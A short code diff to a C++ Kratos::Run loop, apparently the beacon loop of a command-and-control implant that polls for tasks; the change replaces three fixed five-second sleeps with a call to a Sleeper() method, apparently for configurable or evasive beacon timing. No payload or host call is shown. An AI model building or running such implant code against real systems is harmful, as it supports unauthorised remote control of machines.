@@ -15,6 +15,7 @@ BOOL Kratos::Run( ) {
 	const INT32 RequestBase = packager->PackerSize( );
 
 	for ( ;; ) {
+		this->Sleeper();
 		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
 			return FALSE;
 		}
@@ -30,13 +31,11 @@ BOOL Kratos::Run( ) {
 
 		if ( TotalTasks == RESP_NO_TASKS ) {
 			DEBUG_LOG("[+] No Task");
-			Sleep( 5000 );
 			continue;
 		}
 
 		if ( TotalTasks <= 0 || TotalTasks > 64 ) {
 			DEBUG_LOG("[!] Invalid task count");
-			Sleep( 5000 );
 			continue;
 		}
 
@@ -50,7 +49,6 @@ BOOL Kratos::Run( ) {
 			return FALSE;
 		}
 
-		Sleep( 5000 );
 	}
 
 	return TRUE;
